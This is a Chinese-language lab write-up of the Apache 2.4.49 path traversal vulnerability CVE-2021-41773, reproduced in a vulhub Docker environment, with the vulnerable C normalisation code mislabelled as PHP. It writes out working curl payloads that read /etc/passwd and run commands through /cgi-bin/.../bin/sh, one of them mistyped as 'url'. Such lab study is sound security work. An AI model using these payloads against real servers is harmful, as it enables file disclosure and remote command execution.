# Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）



> [vulhub/README.zh-cn.md at master · vulhub/vulhub (github.com)](https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md)

## 1. 漏洞描述

Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：

- 版本等于2.4.49
- 穿越的目录允许被访问，比如配置了`<Directory />Require all granted</Directory>`。（默认情况下是不允许的）

攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。



## 2. 漏洞影响版本

> 版本等于2.4.49

## 3. 漏洞利用过程

`vulhub-master/httpd/CVE-2021-41773`

1. docker-compose build
2. docker-compose up -d
3. 打开网站发现it works!,即为环境搭建完成.(P神演示的在8080端口,实际我的主机上在80端口)
4. 可以用burpsuite或curl构造post发包,这里演示用curl

` curl  http://your-ip:80/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`

即可获取到文件passwd的内容

![image-20220208131145385](image-20220208131145385.png)

## 4. 漏洞利用原理

 核心代码如下:

~~~php
if (w == 0 || IS_SLASH(path[w - 1])) {
    /* Collapse ///// sequences to / */
    .......
    if (path[l] == '.') {
        /* Remove /./ segments */
        if (IS_SLASH_OR_NUL(path[l + 1])) {
            l++;
            if (path[l]) {
                l++;
            }
            continue;
        }
        /* Remove /xx/../ segments */
        if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
            /* 如果l遇到了../开始让w回退到上一个/，不然的话就赋值 */
            if (w > 1) {
                do {
                    w--;
                } while (w && !IS_SLASH(path[w - 1]));
            }
            else {
                /* 如果w回退到0且后续没有内容则报错  */
                if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) {
                    ret = 0;
                }
            }

            /* 因为../的关系让l指针前进两个索引 */
            l += 2;
            if (path[l]) {
                l++;
            }
            continue;
        }
    }
} //用的vulhub,找不到代码在哪直接复制的D4ck大佬的文章

就是利用没匹配到../来绕过过滤,这样就可以构造出来目录遍历所需要的必须输入条件.
~~~

还可以进行命令执行

`url -d "echo;id" 'http://your-ip:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' `

![image-20220208162430743](image-20220208162430743.png)

大佬也没说明POC的运行机理,解出来这个需要逆向知识,暂时还搞不清楚原理